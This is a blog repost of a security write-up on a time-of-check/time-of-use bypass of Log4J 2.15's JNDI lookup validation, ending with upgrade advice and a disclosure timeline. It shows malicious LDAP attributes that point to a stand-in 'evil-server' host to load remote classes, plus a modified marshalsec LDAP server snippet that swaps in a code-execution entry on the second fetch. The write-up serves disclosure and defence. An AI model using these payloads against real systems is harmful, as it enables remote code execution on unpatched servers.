<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>TOCTOU Vulnerability in Log4J 2.15</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>
	==========================<br>
	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
	==========================
	<div style="float: right;">A Techi Personal Blog</div><br>
	<p>
	<nav>
			<a href="/"><b>Start</b></a>.
			
			
			<a href="/posts/"><b>Posts</b></a>.
			
			<a href="/categories/"><b>Categories</b></a>.
			
			<a href="/tags/"><b>Tags</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>TOCTOU Vulnerability in Log4J 2.15</h1>
			<b><time>22.01.2025 00:00</time></b>
		       
		           <a href="/tags/bypass">bypass</a>
        	       
		           <a href="/tags/jndi">jndi</a>
        	       

			<div>
				<p>Log4J has been in the spotlight for the past two weeks for a new attack vector which relies on Java Naming and Directory Interface (JNDI). In this blog, we will detail the new mitigation introduced in 2.15 and the bypass we found using a Time of Check, Time of Use vulnerability (TOCTOU). This vector was also discovered independently by Alvaro Muñoz and Tony Torralba. It is likely that many other individuals have reported related bypass techniques because there were multiple weaknesses in the same Java class (<code>JndiManager</code>).</p>
<p>
<figure>
  <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg7gtceT8evwzGh-PjVe6qJqF11bhu982TrWvDw01qeWQ_JvQxI-QSXKYBXJMu-kbMfzOgO2-cIOSCuZKmTnjyCLEQhNfv9gAk7-RmgZLG-vtVL01fbgnCAYZxNXtmZ4d8q5XsQbDgyfkCUU7F1zgm1Sf48yoLo9tHeTk_q7IhlTixv2SKoEMXWbdVKXw=w510-h281" alt="" />
</figure>


</p>
<h3 id="version-affected">Version affected</h3>
<p>Before we dive into the code, we should clarify that only Log4J version 2.15 and below are vulnerable and only if lookups are enabled for backward compatibility. The JNDI lookup feature was still included in 2.15 and additional checks were made to prevent malicious LDAP attributes when the feature is enabled. These new validations fell short due to a Time of Check, Time of Use vulnerability (TOCTOU).</p>
<h3 id="jndimanagervalidations">JndiManager validations</h3>
<p>The class JndiManager is wrapping the lookup for JNDI which can cause some unexpected code execution specifically if RMI, IIOP or LDAP are used. In Log4J 2.15, RMI and IIOP are not included in the protocol allowlist verification leaving only the LDAP protocol to be used.</p>
<p>Multiples LDAP attribute combinations can be used to trigger code execution. Here are two combinations as described in RFC2713.</p>
<ol>
<li>Factory class
<ul>
<li>javaClassName: PayloadObject</li>
<li>javaCodebase: <code>http://evil-server/</code></li>
<li>javaFactory: Log4jRCE</li>
</ul>
</li>
</ol>
<p>With the previous attributes, the class <code>Log4jRCE</code> is downloaded from <code>http://evil-server/Log4jRCE.class</code> and instantiated.</p>
<ol start="2">
<li>Serializedobject
<ul>
<li>javaClassName: MaliciousGadget</li>
<li>javaSerializedData: ACED01A[….]</li>
<li>javaCodeBase: <code>http://evil-server/</code></li>
</ul>
</li>
</ol>
<p>Based on the previous, JDNI LDAP context will deserialize the data presented in the field <code>javaSerializedData</code>.</p>
<p>When Log4J received the report for the JNDI lookup injection they decided to validate the LDAP entries fetched. For this reason, the name “javaSerializedData”, “javaClassName”, “javaReferenceAddress” and “javaFactory” were added to an attributes deny list in JndiManager. </p>
<p><strong>JndiManager.java</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Map<span style="color:#f92672">&lt;</span>String, Attribute<span style="color:#f92672">&gt;</span> attributeMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>(); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NamingEnumeration<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">extends</span> Attribute<span style="color:#f92672">&gt;</span> enumeration <span style="color:#f92672">=</span> attributes.<span style="color:#a6e22e">getAll</span>(); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (enumeration.<span style="color:#a6e22e">hasMore</span>()) { 
</span></span><span style="display:flex;"><span>    Attribute attribute <span style="color:#f92672">=</span> enumeration.<span style="color:#a6e22e">next</span>(); 
</span></span><span style="display:flex;"><span>    attributeMap.<span style="color:#a6e22e">put</span>(attribute.<span style="color:#a6e22e">getID</span>(), attribute); 
</span></span><span style="display:flex;"><span>}  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Attribute classNameAttr <span style="color:#f92672">=</span> attributeMap.<span style="color:#a6e22e">get</span>(CLASS_NAME);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (attributeMap.<span style="color:#a6e22e">get</span>(SERIALIZED_DATA) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (classNameAttr <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        String className <span style="color:#f92672">=</span> classNameAttr.<span style="color:#a6e22e">get</span>().<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>allowedClasses.<span style="color:#a6e22e">contains</span>(className)) {
</span></span><span style="display:flex;"><span>            LOGGER.<span style="color:#a6e22e">warn</span>(<span style="color:#e6db74">&#34;Deserialization of {} is not allowed&#34;</span>, className);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        LOGGER.<span style="color:#a6e22e">warn</span>(<span style="color:#e6db74">&#34;No class name provided for {}&#34;</span>, name);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (attributeMap.<span style="color:#a6e22e">get</span>(REFERENCE_ADDRESS) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> attributeMap.<span style="color:#a6e22e">get</span>(OBJECT_FACTORY) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>    LOGGER.<span style="color:#a6e22e">warn</span>(<span style="color:#e6db74">&#34;Referenceable class is not allowed for {}&#34;</span>, name);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (URISyntaxException ex) { 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// This is OK. </span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (T) <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">lookup</span>(name); 
</span></span></code></pre></div><p>Ref : Change for LOG4J2-3201</p>
<p> </p>
<h3 id="the-bypass">The Bypass</h3>
<p>The logic, unfortunately, is flawed and it can be bypassed by performing a Time of Check, Time of Use (TOCTOU) attack. You might have found it in the previous code snippet.</p>
<p>Assuming an LDAP entry is fetched using the special expression, the wrapper JndiManager will first load the entry with the method <strong>DirContext.getAttributes()</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Attributes attributes <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">getAttributes</span>(name);
</span></span></code></pre></div><p>Ref : JndiManager.java#L237 </p>
<p>If the entry has no risky attribute, the wrapper proceeds to fetch the entry again. The method used here in the final fetch is <strong>DirContext.lookup()</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (T) <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">lookup</span>(name);
</span></span></code></pre></div><p>Ref: JndiManager.java#L273</p>
<p>An attacker can create a server that would return regular LDAP attributes (CN, SN, UID, etc.) on the first request and on the second one, return attributes that would trigger Java code execution.</p>
<table>
  <thead>
      <tr>
          <th>
<figure>
  <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhyjh1rs4BOFNJQP8X6tfmxXX7sg8os22qbzYG5nEGCi7SsN44aaJgaHu5JDaS2Yqz1fjvXifDdrT9fB3Pqt6t5JK_xZnJdRApNQQY5RKsYvR1SZc6nRTYImiuEE7n7N4rkNWVUDMikah2IHKVPeO7XMbYGo-C4BY95R48S4dzl7ZfwCUAd644Ok_6gjQ=s16000" alt="" />
</figure>


</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Sequence diagram illustrating the attack</td>
      </tr>
  </tbody>
</table>
<p>How to Reproduce To confirmed the vulnerability, we customized marshalsec’s LDAPRefServer tool by adding the choice to send malicious or normal payload is selected manually. Of course, this could easily be automated using unique JNDI URL to keep track of the first request and second request made by the vulnerable server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">&lt;</span>send malicious entry<span style="color:#f92672">&gt;</span>) { <span style="color:#75715e">//Second fetch</span>
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaClassName&#34;</span>, <span style="color:#e6db74">&#34;foo&#34;</span>);
</span></span><span style="display:flex;"><span>    String cbstring <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> refPos <span style="color:#f92672">=</span> cbstring.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;#&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( refPos <span style="color:#f92672">&gt;</span> 0 ) {
</span></span><span style="display:flex;"><span>        cbstring <span style="color:#f92672">=</span> cbstring.<span style="color:#a6e22e">substring</span>(0, refPos);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaCodeBase&#34;</span>, cbstring);
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;objectClass&#34;</span>, <span style="color:#e6db74">&#34;javaNamingReference&#34;</span>); <span style="color:#75715e">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;javaFactory&#34;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">codebase</span>.<span style="color:#a6e22e">getRef</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> { <span style="color:#75715e">//First fetch</span>
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;cn&#34;</span>, <span style="color:#e6db74">&#34;Test&#34;</span>);
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;sn&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>);
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;uid&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>);
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;telephoneNumber&#34;</span>, <span style="color:#e6db74">&#34;123&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p> </p>
<h3 id="conclusion">Conclusion</h3>
<p>If you update your Log4J library to 2.15, it will not be enough to mitigate all potential remote code execution.  At the moment of this writing, 2.17 is the recommended version. Make sure to read the official Log4J advisory page to get the latest update on the vulnerability. It is worth noting that two other vulnerabilities were found on Log4J 2.15: a Denial of Service (DOS) with <code>${ctx}</code> expression and a hostname parsing validation bypass that brings back the remote code execution (RCE) vector.</p>
<p> </p>
<h3></h3>
<h3 id="references">References</h3>
<ul>
<li>Official Log4J advisory page</li>
<li>Log4Shell Update: Severity Upgraded 3.7 -&gt; 9.0 for Second log4j Vulnerability (CVE-2021-45046)</li>
</ul>
<p> </p>
<h3 id="timeline">Timeline</h3>
<ul>
<li>December 10: Log4j 2.15.0 release (Vulnerable to TOCTOU)</li>
<li>December 13: Log4j 2.16.0 release (JNDI fully disabled)</li>
<li>December 16: Vulnerability reported by Tony Torralba and Alvaro Muñoz (Ref)</li>
<li>December 16: Vulnerability reported by GoSecure</li>
<li>December 17: Log4J 2.15 severity raised from 3.7 to 9.0</li>
<li>December 18: Log4j 2.17.0 release</li>
<li>December 20: Received confirmation that the Log4J team is aware of the TOCTOU.</li>
</ul>
<p><em>This blog was originally posted on GoSecure blog.</em></p>
<p>Go to Source</p>

			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/posts/2025-03-21-cve-2025-30345---openslides-cross-site-/">CVE-2025-30345 - OpenSlides Cross-Site Scripting XSS</a></li>
				
				<li><a href="/posts/2025-03-21-cve-2025-30342---openslides-cross-site-/">CVE-2025-30342 - OpenSlides Cross-Site Scripting XSS</a></li>
				
				<li><a href="/posts/2025-03-21-cve-2025-30343---openslides-directory-t/">CVE-2025-30343 - OpenSlides Directory Traversal Vulnerability</a></li>
				
				<li><a href="/posts/2025-03-21-cve-2025-30344---openslides-timing-base/">CVE-2025-30344 - OpenSlides Timing-Based Authentication Bypass</a></li>
				
				<li><a href="/posts/2025-03-21-cve-2024-50053---zohocorp-manageengine-/">CVE-2024-50053 - Zohocorp ManageEngine ServiceDesk Plus Stored Cross-Site Scripting</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
	<a href="https://github.com/Gharib110"><b>Github</b></a>.
	</p>
</footer>

</body>
</html>
